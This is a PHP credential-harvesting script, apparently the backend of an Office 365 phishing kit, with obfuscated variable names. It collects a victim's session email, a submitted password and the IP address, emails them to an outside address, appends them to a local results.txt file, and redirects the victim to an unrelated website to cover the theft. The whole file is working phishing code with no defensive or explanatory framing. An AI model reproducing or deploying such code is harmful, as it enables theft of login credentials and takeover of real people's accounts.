<?php
session_start();
$Vaciknufzsky = getenv("REMOTE_ADDR");
$Vd5rgrkn3ik3 = "";
$Vd5rgrkn3ik3 .= "===============|New Log|==============\n";
$Vd5rgrkn3ik3 .= "Email: ".$_SESSION['clientemail']."\n";
$Vd5rgrkn3ik3 .= "Second Password: ".$_POST['password']."\n";
$Vd5rgrkn3ik3 .= "IP: ".$Vaciknufzsky."\n";
$Vd5rgrkn3ik3 .= "===============|Burhan-updated|==============\n";
$V3gxu1m2kgkm = "burhan.ahmad@yandex.com";
$Vzvoneollnqp = "OFFICE365 - LOGIN - FROM [$Vaciknufzsky]";
$V30sbmn0ftdu = "From: Burhan-updated<goggle.comm>";
$V30sbmn0ftdu .= $_POST['eMailAdd']."\n";
$V30sbmn0ftdu .= "MIME-Version: 1.0\n";
mail("$V3gxu1m2kgkm",$Vzvoneollnqp,$Vd5rgrkn3ik3,$V30sbmn0ftdu); 
$fp = fopen("results.txt","a");
fputs($fp,$Vd5rgrkn3ik3);
fclose($fp);
header("Location: https://www.houseplans.co.nz/house-plans/lifestyle-2/");
	  

?>
